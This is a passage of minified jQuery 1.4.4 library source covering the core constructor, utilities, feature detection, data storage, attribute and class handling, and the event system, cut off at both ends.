h.preType==="mouseleave"){a.type=h.preType;e=c(a.relatedTarget).closest(h.selector)[0]}if(!e||e!==l)C.push({elem:l,handleObj:h,level:r.level})}}}o=0;for(x=C.length;o<x;o++){f=C[o];if(d&&f.level>d)break;a.currentTarget=f.elem;a.data=f.handleObj.data;a.handleObj=f.handleObj;A=f.handleObj.origHandler.apply(f.elem,arguments);if(A===false||a.isPropagationStopped()){d=f.level;if(A===false)b=false;if(a.isImmediatePropagationStopped())break}}return b}}function Y(a,b){return(a&&a!=="*"?a+".":"")+b.replace(La,
"`").replace(Ma,"&")}function ma(a,b,d){if(c.isFunction(b))return c.grep(a,function(f,h){return!!b.call(f,h,f)===d});else if(b.nodeType)return c.grep(a,function(f){return f===b===d});else if(typeof b==="string"){var e=c.grep(a,function(f){return f.nodeType===1});if(Na.test(b))return c.filter(b,e,!d);else b=c.filter(b,e)}return c.grep(a,function(f){return c.inArray(f,b)>=0===d})}function na(a,b){var d=0;b.each(function(){if(this.nodeName===(a[d]&&a[d].nodeName)){var e=c.data(a[d++]),f=c.data(this,
e);if(e=e&&e.events){delete f.handle;f.events={};for(var h in e)for(var l in e[h])c.event.add(this,h,e[h][l],e[h][l].data)}}})}function Oa(a,b){b.src?c.ajax({url:b.src,async:false,dataType:"script"}):c.globalEval(b.text||b.textContent||b.innerHTML||"");b.parentNode&&b.parentNode.removeChild(b)}function oa(a,b,d){var e=b==="width"?a.offsetWidth:a.offsetHeight;if(d==="border")return e;c.each(b==="width"?Pa:Qa,function(){d||(e-=parseFloat(c.css(a,"padding"+this))||0);if(d==="margin")e+=parseFloat(c.css(a,
"margin"+this))||0;else e-=parseFloat(c.css(a,"border"+this+"Width"))||0});return e}function da(a,b,d,e){if(c.isArray(b)&&b.length)c.each(b,function(f,h){d||Ra.test(a)?e(a,h):da(a+"["+(typeof h==="object"||c.isArray(h)?f:"")+"]",h,d,e)});else if(!d&&b!=null&&typeof b==="object")c.isEmptyObject(b)?e(a,""):c.each(b,function(f,h){da(a+"["+f+"]",h,d,e)});else e(a,b)}function S(a,b){var d={};c.each(pa.concat.apply([],pa.slice(0,b)),function(){d[this]=a});return d}function qa(a){if(!ea[a]){var b=c("<"+
a+">").appendTo("body"),d=b.css("display");b.remove();if(d==="none"||d==="")d="block";ea[a]=d}return ea[a]}function fa(a){return c.isWindow(a)?a:a.nodeType===9?a.defaultView||a.parentWindow:false}var t=E.document,c=function(){function a(){if(!b.isReady){try{t.documentElement.doScroll("left")}catch(j){setTimeout(a,1);return}b.ready()}}var b=function(j,s){return new b.fn.init(j,s)},d=E.jQuery,e=E.$,f,h=/^(?:[^<]*(<[\w\W]+>)[^>]*$|#([\w\-]+)$)/,l=/\S/,k=/^\s+/,o=/\s+$/,x=/\W/,r=/\d/,A=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,
C=/^[\],:{}\s]*$/,J=/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,w=/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,I=/(?:^|:|,)(?:\s*\[)+/g,L=/(webkit)[ \/]([\w.]+)/,g=/(opera)(?:.*version)?[ \/]([\w.]+)/,i=/(msie) ([\w.]+)/,n=/(mozilla)(?:.*? rv:([\w.]+))?/,m=navigator.userAgent,p=false,q=[],u,y=Object.prototype.toString,F=Object.prototype.hasOwnProperty,M=Array.prototype.push,N=Array.prototype.slice,O=String.prototype.trim,D=Array.prototype.indexOf,R={};b.fn=b.prototype={init:function(j,
s){var v,z,H;if(!j)return this;if(j.nodeType){this.context=this[0]=j;this.length=1;return this}if(j==="body"&&!s&&t.body){this.context=t;this[0]=t.body;this.selector="body";this.length=1;return this}if(typeof j==="string")if((v=h.exec(j))&&(v[1]||!s))if(v[1]){H=s?s.ownerDocument||s:t;if(z=A.exec(j))if(b.isPlainObject(s)){j=[t.createElement(z[1])];b.fn.attr.call(j,s,true)}else j=[H.createElement(z[1])];else{z=b.buildFragment([v[1]],[H]);j=(z.cacheable?z.fragment.cloneNode(true):z.fragment).childNodes}return b.merge(this,
j)}else{if((z=t.getElementById(v[2]))&&z.parentNode){if(z.id!==v[2])return f.find(j);this.length=1;this[0]=z}this.context=t;this.selector=j;return this}else if(!s&&!x.test(j)){this.selector=j;this.context=t;j=t.getElementsByTagName(j);return b.merge(this,j)}else return!s||s.jquery?(s||f).find(j):b(s).find(j);else if(b.isFunction(j))return f.ready(j);if(j.selector!==B){this.selector=j.selector;this.context=j.context}return b.makeArray(j,this)},selector:"",jquery:"1.4.4",length:0,size:function(){return this.length},
toArray:function(){return N.call(this,0)},get:function(j){return j==null?this.toArray():j<0?this.slice(j)[0]:this[j]},pushStack:function(j,s,v){var z=b();b.isArray(j)?M.apply(z,j):b.merge(z,j);z.prevObject=this;z.context=this.context;if(s==="find")z.selector=this.selector+(this.selector?" ":"")+v;else if(s)z.selector=this.selector+"."+s+"("+v+")";return z},each:function(j,s){return b.each(this,j,s)},ready:function(j){b.bindReady();if(b.isReady)j.call(t,b);else q&&q.push(j);return this},eq:function(j){return j===
-1?this.slice(j):this.slice(j,+j+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(N.apply(this,arguments),"slice",N.call(arguments).join(","))},map:function(j){return this.pushStack(b.map(this,function(s,v){return j.call(s,v,s)}))},end:function(){return this.prevObject||b(null)},push:M,sort:[].sort,splice:[].splice};b.fn.init.prototype=b.fn;b.extend=b.fn.extend=function(){var j,s,v,z,H,G=arguments[0]||{},K=1,Q=arguments.length,ga=false;
if(typeof G==="boolean"){ga=G;G=arguments[1]||{};K=2}if(typeof G!=="object"&&!b.isFunction(G))G={};if(Q===K){G=this;--K}for(;K<Q;K++)if((j=arguments[K])!=null)for(s in j){v=G[s];z=j[s];if(G!==z)if(ga&&z&&(b.isPlainObject(z)||(H=b.isArray(z)))){if(H){H=false;v=v&&b.isArray(v)?v:[]}else v=v&&b.isPlainObject(v)?v:{};G[s]=b.extend(ga,v,z)}else if(z!==B)G[s]=z}return G};b.extend({noConflict:function(j){E.$=e;if(j)E.jQuery=d;return b},isReady:false,readyWait:1,ready:function(j){j===true&&b.readyWait--;
if(!b.readyWait||j!==true&&!b.isReady){if(!t.body)return setTimeout(b.ready,1);b.isReady=true;if(!(j!==true&&--b.readyWait>0))if(q){var s=0,v=q;for(q=null;j=v[s++];)j.call(t,b);b.fn.trigger&&b(t).trigger("ready").unbind("ready")}}},bindReady:function(){if(!p){p=true;if(t.readyState==="complete")return setTimeout(b.ready,1);if(t.addEventListener){t.addEventListener("DOMContentLoaded",u,false);E.addEventListener("load",b.ready,false)}else if(t.attachEvent){t.attachEvent("onreadystatechange",u);E.attachEvent("onload",
b.ready);var j=false;try{j=E.frameElement==null}catch(s){}t.documentElement.doScroll&&j&&a()}}},isFunction:function(j){return b.type(j)==="function"},isArray:Array.isArray||function(j){return b.type(j)==="array"},isWindow:function(j){return j&&typeof j==="object"&&"setInterval"in j},isNaN:function(j){return j==null||!r.test(j)||isNaN(j)},type:function(j){return j==null?String(j):R[y.call(j)]||"object"},isPlainObject:function(j){if(!j||b.type(j)!=="object"||j.nodeType||b.isWindow(j))return false;if(j.constructor&&
!F.call(j,"constructor")&&!F.call(j.constructor.prototype,"isPrototypeOf"))return false;for(var s in j);return s===B||F.call(j,s)},isEmptyObject:function(j){for(var s in j)return false;return true},error:function(j){throw j;},parseJSON:function(j){if(typeof j!=="string"||!j)return null;j=b.trim(j);if(C.test(j.replace(J,"@").replace(w,"]").replace(I,"")))return E.JSON&&E.JSON.parse?E.JSON.parse(j):(new Function("return "+j))();else b.error("Invalid JSON: "+j)},noop:function(){},globalEval:function(j){if(j&&
l.test(j)){var s=t.getElementsByTagName("head")[0]||t.documentElement,v=t.createElement("script");v.type="text/javascript";if(b.support.scriptEval)v.appendChild(t.createTextNode(j));else v.text=j;s.insertBefore(v,s.firstChild);s.removeChild(v)}},nodeName:function(j,s){return j.nodeName&&j.nodeName.toUpperCase()===s.toUpperCase()},each:function(j,s,v){var z,H=0,G=j.length,K=G===B||b.isFunction(j);if(v)if(K)for(z in j){if(s.apply(j[z],v)===false)break}else for(;H<G;){if(s.apply(j[H++],v)===false)break}else if(K)for(z in j){if(s.call(j[z],
z,j[z])===false)break}else for(v=j[0];H<G&&s.call(v,H,v)!==false;v=j[++H]);return j},trim:O?function(j){return j==null?"":O.call(j)}:function(j){return j==null?"":j.toString().replace(k,"").replace(o,"")},makeArray:function(j,s){var v=s||[];if(j!=null){var z=b.type(j);j.length==null||z==="string"||z==="function"||z==="regexp"||b.isWindow(j)?M.call(v,j):b.merge(v,j)}return v},inArray:function(j,s){if(s.indexOf)return s.indexOf(j);for(var v=0,z=s.length;v<z;v++)if(s[v]===j)return v;return-1},merge:function(j,
s){var v=j.length,z=0;if(typeof s.length==="number")for(var H=s.length;z<H;z++)j[v++]=s[z];else for(;s[z]!==B;)j[v++]=s[z++];j.length=v;return j},grep:function(j,s,v){var z=[],H;v=!!v;for(var G=0,K=j.length;G<K;G++){H=!!s(j[G],G);v!==H&&z.push(j[G])}return z},map:function(j,s,v){for(var z=[],H,G=0,K=j.length;G<K;G++){H=s(j[G],G,v);if(H!=null)z[z.length]=H}return z.concat.apply([],z)},guid:1,proxy:function(j,s,v){if(arguments.length===2)if(typeof s==="string"){v=j;j=v[s];s=B}else if(s&&!b.isFunction(s)){v=
s;s=B}if(!s&&j)s=function(){return j.apply(v||this,arguments)};if(j)s.guid=j.guid=j.guid||s.guid||b.guid++;return s},access:function(j,s,v,z,H,G){var K=j.length;if(typeof s==="object"){for(var Q in s)b.access(j,Q,s[Q],z,H,v);return j}if(v!==B){z=!G&&z&&b.isFunction(v);for(Q=0;Q<K;Q++)H(j[Q],s,z?v.call(j[Q],Q,H(j[Q],s)):v,G);return j}return K?H(j[0],s):B},now:function(){return(new Date).getTime()},uaMatch:function(j){j=j.toLowerCase();j=L.exec(j)||g.exec(j)||i.exec(j)||j.indexOf("compatible")<0&&n.exec(j)||
[];return{browser:j[1]||"",version:j[2]||"0"}},browser:{}});b.each("Boolean Number String Function Array Date RegExp Object".split(" "),function(j,s){R["[object "+s+"]"]=s.toLowerCase()});m=b.uaMatch(m);if(m.browser){b.browser[m.browser]=true;b.browser.version=m.version}if(b.browser.webkit)b.browser.safari=true;if(D)b.inArray=function(j,s){return D.call(s,j)};if(!/\s/.test("\u00a0")){k=/^[\s\xA0]+/;o=/[\s\xA0]+$/}f=b(t);if(t.addEventListener)u=function(){t.removeEventListener("DOMContentLoaded",u,
false);b.ready()};else if(t.attachEvent)u=function(){if(t.readyState==="complete"){t.detachEvent("onreadystatechange",u);b.ready()}};return E.jQuery=E.$=b}();(function(){c.support={};var a=t.documentElement,b=t.createElement("script"),d=t.createElement("div"),e="script"+c.now();d.style.display="none";d.innerHTML="   <link/><table></table><a href='/a' style='color:red;float:left;opacity:.55;'>a</a><input type='checkbox'/>";var f=d.getElementsByTagName("*"),h=d.getElementsByTagName("a")[0],l=t.createElement("select"),
k=l.appendChild(t.createElement("option"));if(!(!f||!f.length||!h)){c.support={leadingWhitespace:d.firstChild.nodeType===3,tbody:!d.getElementsByTagName("tbody").length,htmlSerialize:!!d.getElementsByTagName("link").length,style:/red/.test(h.getAttribute("style")),hrefNormalized:h.getAttribute("href")==="/a",opacity:/^0.55$/.test(h.style.opacity),cssFloat:!!h.style.cssFloat,checkOn:d.getElementsByTagName("input")[0].value==="on",optSelected:k.selected,deleteExpando:true,optDisabled:false,checkClone:false,
scriptEval:false,noCloneEvent:true,boxModel:null,inlineBlockNeedsLayout:false,shrinkWrapBlocks:false,reliableHiddenOffsets:true};l.disabled=true;c.support.optDisabled=!k.disabled;b.type="text/javascript";try{b.appendChild(t.createTextNode("window."+e+"=1;"))}catch(o){}a.insertBefore(b,a.firstChild);if(E[e]){c.support.scriptEval=true;delete E[e]}try{delete b.test}catch(x){c.support.deleteExpando=false}a.removeChild(b);if(d.attachEvent&&d.fireEvent){d.attachEvent("onclick",function r(){c.support.noCloneEvent=
false;d.detachEvent("onclick",r)});d.cloneNode(true).fireEvent("onclick")}d=t.createElement("div");d.innerHTML="<input type='radio' name='radiotest' checked='checked'/>";a=t.createDocumentFragment();a.appendChild(d.firstChild);c.support.checkClone=a.cloneNode(true).cloneNode(true).lastChild.checked;c(function(){var r=t.createElement("div");r.style.width=r.style.paddingLeft="1px";t.body.appendChild(r);c.boxModel=c.support.boxModel=r.offsetWidth===2;if("zoom"in r.style){r.style.display="inline";r.style.zoom=
1;c.support.inlineBlockNeedsLayout=r.offsetWidth===2;r.style.display="";r.innerHTML="<div style='width:4px;'></div>";c.support.shrinkWrapBlocks=r.offsetWidth!==2}r.innerHTML="<table><tr><td style='padding:0;display:none'></td><td>t</td></tr></table>";var A=r.getElementsByTagName("td");c.support.reliableHiddenOffsets=A[0].offsetHeight===0;A[0].style.display="";A[1].style.display="none";c.support.reliableHiddenOffsets=c.support.reliableHiddenOffsets&&A[0].offsetHeight===0;r.innerHTML="";t.body.removeChild(r).style.display=
"none"});a=function(r){var A=t.createElement("div");r="on"+r;var C=r in A;if(!C){A.setAttribute(r,"return;");C=typeof A[r]==="function"}return C};c.support.submitBubbles=a("submit");c.support.changeBubbles=a("change");a=b=d=f=h=null}})();var ra={},Ja=/^(?:\{.*\}|\[.*\])$/;c.extend({cache:{},uuid:0,expando:"jQuery"+c.now(),noData:{embed:true,object:"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000",applet:true},data:function(a,b,d){if(c.acceptData(a)){a=a==E?ra:a;var e=a.nodeType,f=e?a[c.expando]:null,h=
c.cache;if(!(e&&!f&&typeof b==="string"&&d===B)){if(e)f||(a[c.expando]=f=++c.uuid);else h=a;if(typeof b==="object")if(e)h[f]=c.extend(h[f],b);else c.extend(h,b);else if(e&&!h[f])h[f]={};a=e?h[f]:h;if(d!==B)a[b]=d;return typeof b==="string"?a[b]:a}}},removeData:function(a,b){if(c.acceptData(a)){a=a==E?ra:a;var d=a.nodeType,e=d?a[c.expando]:a,f=c.cache,h=d?f[e]:e;if(b){if(h){delete h[b];d&&c.isEmptyObject(h)&&c.removeData(a)}}else if(d&&c.support.deleteExpando)delete a[c.expando];else if(a.removeAttribute)a.removeAttribute(c.expando);
else if(d)delete f[e];else for(var l in a)delete a[l]}},acceptData:function(a){if(a.nodeName){var b=c.noData[a.nodeName.toLowerCase()];if(b)return!(b===true||a.getAttribute("classid")!==b)}return true}});c.fn.extend({data:function(a,b){var d=null;if(typeof a==="undefined"){if(this.length){var e=this[0].attributes,f;d=c.data(this[0]);for(var h=0,l=e.length;h<l;h++){f=e[h].name;if(f.indexOf("data-")===0){f=f.substr(5);ka(this[0],f,d[f])}}}return d}else if(typeof a==="object")return this.each(function(){c.data(this,
a)});var k=a.split(".");k[1]=k[1]?"."+k[1]:"";if(b===B){d=this.triggerHandler("getData"+k[1]+"!",[k[0]]);if(d===B&&this.length){d=c.data(this[0],a);d=ka(this[0],a,d)}return d===B&&k[1]?this.data(k[0]):d}else return this.each(function(){var o=c(this),x=[k[0],b];o.triggerHandler("setData"+k[1]+"!",x);c.data(this,a,b);o.triggerHandler("changeData"+k[1]+"!",x)})},removeData:function(a){return this.each(function(){c.removeData(this,a)})}});c.extend({queue:function(a,b,d){if(a){b=(b||"fx")+"queue";var e=
c.data(a,b);if(!d)return e||[];if(!e||c.isArray(d))e=c.data(a,b,c.makeArray(d));else e.push(d);return e}},dequeue:function(a,b){b=b||"fx";var d=c.queue(a,b),e=d.shift();if(e==="inprogress")e=d.shift();if(e){b==="fx"&&d.unshift("inprogress");e.call(a,function(){c.dequeue(a,b)})}}});c.fn.extend({queue:function(a,b){if(typeof a!=="string"){b=a;a="fx"}if(b===B)return c.queue(this[0],a);return this.each(function(){var d=c.queue(this,a,b);a==="fx"&&d[0]!=="inprogress"&&c.dequeue(this,a)})},dequeue:function(a){return this.each(function(){c.dequeue(this,
a)})},delay:function(a,b){a=c.fx?c.fx.speeds[a]||a:a;b=b||"fx";return this.queue(b,function(){var d=this;setTimeout(function(){c.dequeue(d,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])}});var sa=/[\n\t]/g,ha=/\s+/,Sa=/\r/g,Ta=/^(?:href|src|style)$/,Ua=/^(?:button|input)$/i,Va=/^(?:button|input|object|select|textarea)$/i,Wa=/^a(?:rea)?$/i,ta=/^(?:radio|checkbox)$/i;c.props={"for":"htmlFor","class":"className",readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing",rowspan:"rowSpan",
colspan:"colSpan",tabindex:"tabIndex",usemap:"useMap",frameborder:"frameBorder"};c.fn.extend({attr:function(a,b){return c.access(this,a,b,true,c.attr)},removeAttr:function(a){return this.each(function(){c.attr(this,a,"");this.nodeType===1&&this.removeAttribute(a)})},addClass:function(a){if(c.isFunction(a))return this.each(function(x){var r=c(this);r.addClass(a.call(this,x,r.attr("class")))});if(a&&typeof a==="string")for(var b=(a||"").split(ha),d=0,e=this.length;d<e;d++){var f=this[d];if(f.nodeType===
1)if(f.className){for(var h=" "+f.className+" ",l=f.className,k=0,o=b.length;k<o;k++)if(h.indexOf(" "+b[k]+" ")<0)l+=" "+b[k];f.className=c.trim(l)}else f.className=a}return this},removeClass:function(a){if(c.isFunction(a))return this.each(function(o){var x=c(this);x.removeClass(a.call(this,o,x.attr("class")))});if(a&&typeof a==="string"||a===B)for(var b=(a||"").split(ha),d=0,e=this.length;d<e;d++){var f=this[d];if(f.nodeType===1&&f.className)if(a){for(var h=(" "+f.className+" ").replace(sa," "),
l=0,k=b.length;l<k;l++)h=h.replace(" "+b[l]+" "," ");f.className=c.trim(h)}else f.className=""}return this},toggleClass:function(a,b){var d=typeof a,e=typeof b==="boolean";if(c.isFunction(a))return this.each(function(f){var h=c(this);h.toggleClass(a.call(this,f,h.attr("class"),b),b)});return this.each(function(){if(d==="string")for(var f,h=0,l=c(this),k=b,o=a.split(ha);f=o[h++];){k=e?k:!l.hasClass(f);l[k?"addClass":"removeClass"](f)}else if(d==="undefined"||d==="boolean"){this.className&&c.data(this,
"__className__",this.className);this.className=this.className||a===false?"":c.data(this,"__className__")||""}})},hasClass:function(a){a=" "+a+" ";for(var b=0,d=this.length;b<d;b++)if((" "+this[b].className+" ").replace(sa," ").indexOf(a)>-1)return true;return false},val:function(a){if(!arguments.length){var b=this[0];if(b){if(c.nodeName(b,"option")){var d=b.attributes.value;return!d||d.specified?b.value:b.text}if(c.nodeName(b,"select")){var e=b.selectedIndex;d=[];var f=b.options;b=b.type==="select-one";
if(e<0)return null;var h=b?e:0;for(e=b?e+1:f.length;h<e;h++){var l=f[h];if(l.selected&&(c.support.optDisabled?!l.disabled:l.getAttribute("disabled")===null)&&(!l.parentNode.disabled||!c.nodeName(l.parentNode,"optgroup"))){a=c(l).val();if(b)return a;d.push(a)}}return d}if(ta.test(b.type)&&!c.support.checkOn)return b.getAttribute("value")===null?"on":b.value;return(b.value||"").replace(Sa,"")}return B}var k=c.isFunction(a);return this.each(function(o){var x=c(this),r=a;if(this.nodeType===1){if(k)r=
a.call(this,o,x.val());if(r==null)r="";else if(typeof r==="number")r+="";else if(c.isArray(r))r=c.map(r,function(C){return C==null?"":C+""});if(c.isArray(r)&&ta.test(this.type))this.checked=c.inArray(x.val(),r)>=0;else if(c.nodeName(this,"select")){var A=c.makeArray(r);c("option",this).each(function(){this.selected=c.inArray(c(this).val(),A)>=0});if(!A.length)this.selectedIndex=-1}else this.value=r}})}});c.extend({attrFn:{val:true,css:true,html:true,text:true,data:true,width:true,height:true,offset:true},
attr:function(a,b,d,e){if(!a||a.nodeType===3||a.nodeType===8)return B;if(e&&b in c.attrFn)return c(a)[b](d);e=a.nodeType!==1||!c.isXMLDoc(a);var f=d!==B;b=e&&c.props[b]||b;var h=Ta.test(b);if((b in a||a[b]!==B)&&e&&!h){if(f){b==="type"&&Ua.test(a.nodeName)&&a.parentNode&&c.error("type property can't be changed");if(d===null)a.nodeType===1&&a.removeAttribute(b);else a[b]=d}if(c.nodeName(a,"form")&&a.getAttributeNode(b))return a.getAttributeNode(b).nodeValue;if(b==="tabIndex")return(b=a.getAttributeNode("tabIndex"))&&
b.specified?b.value:Va.test(a.nodeName)||Wa.test(a.nodeName)&&a.href?0:B;return a[b]}if(!c.support.style&&e&&b==="style"){if(f)a.style.cssText=""+d;return a.style.cssText}f&&a.setAttribute(b,""+d);if(!a.attributes[b]&&a.hasAttribute&&!a.hasAttribute(b))return B;a=!c.support.hrefNormalized&&e&&h?a.getAttribute(b,2):a.getAttribute(b);return a===null?B:a}});var X=/\.(.*)$/,ia=/^(?:textarea|input|select)$/i,La=/\./g,Ma=/ /g,Xa=/[^\w\s.|`]/g,Ya=function(a){return a.replace(Xa,"\\$&")},ua={focusin:0,focusout:0};
c.event={add:function(a,b,d,e){if(!(a.nodeType===3||a.nodeType===8)){if(c.isWindow(a)&&a!==E&&!a.frameElement)a=E;if(d===false)d=U;else if(!d)return;var f,h;if(d.handler){f=d;d=f.handler}if(!d.guid)d.guid=c.guid++;if(h=c.data(a)){var l=a.nodeType?"events":"__events__",k=h[l],o=h.handle;if(typeof k==="function"){o=k.handle;k=k.events}else if(!k){a.nodeType||(h[l]=h=function(){});h.events=k={}}if(!o)h.handle=o=function(){return typeof c!=="undefined"&&!c.event.triggered?c.event.handle.apply(o.elem,
arguments):B};o.elem=a;b=b.split(" ");for(var x=0,r;l=b[x++];){h=f?c.extend({},f):{handler:d,data:e};if(l.indexOf(".")>-1){r=l.split(".");l=r.shift();h.namespace=r.slice(0).sort().join(".")}else{r=[];h.namespace=""}h.type=l;if(!h.guid)h.guid=d.guid;var A=k[l],C=c.event.special[l]||{};if(!A){A=k[l]=[];if(!C.setup||C.setup.call(a,e,r,o)===false)if(a.addEventListener)a.addEventListener(l,o,false);else a.attachEvent&&a.attachEvent("on"+l,o)}if(C.add){C.add.call(a,h);if(!h.handler.guid)h.handler.guid=
d.guid}A.push(h);c.event.global[l]=true}a=null}}},global:{},remove:function(a,b,d,e){if(!(a.nodeType===3||a.nodeType===8)){if(d===false)d=U;var f,h,l=0,k,o,x,r,A,C,J=a.nodeType?"events":"__events__",w=c.data(a),I=w&&w[J];if(w&&I){if(typeof I==="function"){w=I;I=I.events}if(b&&b.type){d=b.handler;b=b.type}if(!b||typeof b==="string"&&b.charAt(0)==="."){b=b||"";for(f in I)c.event.remove(a,f+b)}else{for(b=b.split(" ");f=b[l++];){r=f;k=f.indexOf(".")<0;o=[];if(!k){o=f.split(".");f=o.shift();x=RegExp("(^|\\.)"+
c.map(o.slice(0).sort(),Ya).join("\\.(?:.*\\.)?")+"(\\.|$)")}if(A=I[f])if(d){r=c.event.special[f]||{};for(h=e||0;h<A.length;h++){C=A[h];if(d.guid===C.guid){if(k||x.test(C.namespace)){e==null&&A.splice(h--,1);r.remove&&r.remove.call(a,C)}if(e!=null)break}}if(A.length===0||e!=null&&A.length===1){if(!r.teardown||r.teardown.call(a,o)===false)c.removeEvent(a,f,w.handle);delete I[f]}}else for(h=0;h<A.length;h++){C=A[h];if(k||x.test(C.namespace)){c.event.remove(a,r,C.handler,h);A.splice(h--,1)}}}if(c.isEmptyObject(I)){if(b=
w.handle)b.elem=null;delete w.events;delete w.handle;if(typeof w==="function")c.removeData(a,J);else c.isEmptyObject(w)&&c.removeData(a)}}}}},trigger:function(a,b,d,e){var f=a.type||a;if(!e){a=typeof a==="object"?a[c.expando]?a:c.extend(c.Event(f),a):c.Event(f);if(f.indexOf("!")>=0){a.type=f=f.slice(0,-1);a.exclusive=true}if(!d){a.stopPropagation();c.event.global[f]&&c.each(c.cache,function(){this.events&&this.events[f]&&c.event.trigger(a,b,this.handle.elem)})}if(!d||d.nodeType===3||d.nodeType===
8)return B;a.result=B;a.target=d;b=c.makeArray(b);b.unshift(a)}a.currentTarget=d;(e=d.nodeType?c.data(d,"handle"):(c.data(d,"__events__")||{}).handle)&&e.apply(d,b);e=d.parentNode||d.ownerDocument;try{if(!(d&&d.nodeName&&c.noData[d.nodeName.toLowerCase()]))if(d["on"+f]&&d["on"+f].apply(d,b)===false){a.result=false;a.preventDefault()}}catch(h){}if(!a.isPropagationStopped()&&e)c.event.trigger(a,b,e,true);else if(!a.isDefaultPrevented()){var l;e=a.target;var k=f.replace(X,""),o=c.nodeName(e,"a")&&k===
"click",x=c.event.special[k]||{};if((!x._default||x._default.call(d,a)===false)&&!o&&!(e&&e.nodeName&&c.noData[e.nodeName.toLowerCase()])){try{if(e[k]){if(l=e["on"+k])e["on"+k]=null;c.event.triggered=true;e[k]()}}catch(r){}if(l)e["on"+k]=l;c.event.triggered=false}}},handle:function(a){var b,d,e,f;d=[];var h=c.makeArray(arguments);a=h[0]=c.event.fix(a||E.event);a.currentTarget=this;b=a.type.indexOf(".")<0&&!a.exclusive;if(!b){e=a.type.split(".");a.type=e.shift();d=e.slice(0).sort();e=RegExp("(^|\\.)"+
d.join("\\.(?:.*\\.)?")+"(\\.|$)")}a.namespace=a.namespace||d.join(".");f=c.data(this,this.nodeType?"events":"__events__");if(typeof f==="function")f=f.events;d=(f||{})[a.type];if(f&&d){d=d.slice(0);f=0;for(var l=d.length;f<l;f++){var k=d[f];if(b||e.test(k.namespace)){a.handler=k.handler;a.data=k.data;a.handleObj=k;k=k.handler.apply(this,h);if(k!==B){a.result=k;if(k===false){a.preventDefault();a.stopPropagation()}}if(a.isImmediatePropagationStopped())break}}}return a.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),
fix:function(a){if(a[c.expando])return a;var b=a;a=c.Event(b);for(var d=this.props.length,e;d;){e=this.props[--d];a[e]=b[e]}if(!a.target)a.target=a.srcElement||t;if(a.target.nodeType===3)a.target=a.target.parentNode;if(!a.relatedTarget&&a.fromElement)a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement;if(a.pageX==null&&a.clientX!=null){b=t.documentElement;d=t.body;a.pageX=a.clientX+(b&&b.scrollLeft||d&&d.scrollLeft||0)-(b&&b.clientLeft||d&&d.clientLeft||0);a.pageY=a.clientY+(b&&b.scrollTop||
d&&d.scrollTop||0)-(b&&b.clientTop||d&&d.clientTop||0)}if(a.which==null&&(a.charCode!=null||a.keyCode!=null))a.which=a.charCode!=null?a.charCode:a.keyCode;if(!a.metaKey&&a.ctrlKey)a.metaKey=a.ctrlKey;if(!a.which&&a.button!==B)a.which=a.button&1?1:a.button&2?3:a.button&4?2:0;return a},guid:1E8,proxy:c.proxy,special:{ready:{setup:c.bindReady,teardown:c.noop},live:{add:function(a){c.event.add(this,Y(a.origType,a.selector),c.extend({},a,{handler:Ka,guid:a.handler.guid}))},remove:function(a){c.event.remove(this,
Y(a.origType,a.selector),a)}},beforeunload:{setup:function(a,b,d){if(c.isWindow(this))this.onbeforeunload=d},teardown:function(a,b){if(this.onbeforeunload===b)this.onbeforeunload=null}}}};c.removeEvent=t.removeEventListener?function(a,b,d){a.removeEventListener&&a.removeEventListener(b,d,false)}:function(a,b,d){a.detachEvent&&a.detachEvent("on"+b,d)};c.Event=function(a){if(!this.preventDefault)return new c.Event(a);if(a&&a.type){this.originalEvent=a;this.type=a.type}else this.type=a;this.timeStamp=
c.now();this[c.expando]=true};c.Event.prototype={preventDefault:function(){this.isDefaultPrevented=ca;var a=this.originalEvent;if(a)if(a.preventDefault)a.preventDefault();else a.returnValue=false},stopPropagation:function(){this.isPropagationStopped=ca;var a=this.originalEvent;if(a){a.stopPropagation&&a.stopPropagation();a.cancelBubble=true}},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=ca;this.stopPropagation()},isDefaultPrevented:U,isPropagationStopped:U,isImmediatePropagationStopped:U};
var va=function(a){var b=a.relatedTarget;try{for(;b&&b!==this;)b=b.parentNode;if(b!==this){a.type=a.data;c.event.handle.apply(this,arguments)}}catch(d){}},wa=function(a){a.type=a.data;c.event.handle.apply(this,arguments)};c.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){c.event.special[a]={setup:function(d){c.event.add(this,b,d&&d.selector?wa:va,a)},teardown:function(d){c.event.remove(this,b,d&&d.selector?wa:va)}}});if(!c.support.submitBubbles)c.event.special.submit={setup:function(){if(this.nodeName.toLowerCase()!==
"form"){c.event.add(this,"click.specialSubmit",function(a){var b=a.target,d=b.type;if((d==="submit"||d==="image")&&c(b).closest("form").length){a.liveFired=B;return la("submit",this,arguments)}});c.event.add(this,"keypress.specialSubmit",function(a){var b=a.target,d=b.type;if((d==="text"||d==="password")&&c(b).closest("form").length&&a.keyCode===13){a.liveFired=B;return la("submit",this,arguments)}})}else return false},teardown:function(){c.event.remove(this,".specialSubmit")}};if(!c.support.changeBubbles){var V,
xa=function(a){var b=a.type,d=a.value;if(b==="radio"||b==="checkbox")d=a.checked;else if(b==="select-multiple")d=a.selectedIndex>-1?c.map(a.options,function(e){return e.selected}).join("-"):"";else if(a.nodeName.toLowerCase()==="select")d=a.selectedIndex;return d},Z=function(a,b){var d=a.target,e,f;if(!(!ia.test(d.nodeName)||d.readOnly)){e=c.data(d,"_change_data");f=xa(d);if(a.type!=="focusout"||d.type!=="radio")c.data(d,"_change_data",f);if(!(e===B||f===e))if(e!=null||f){a.type="change";a.liveFired=
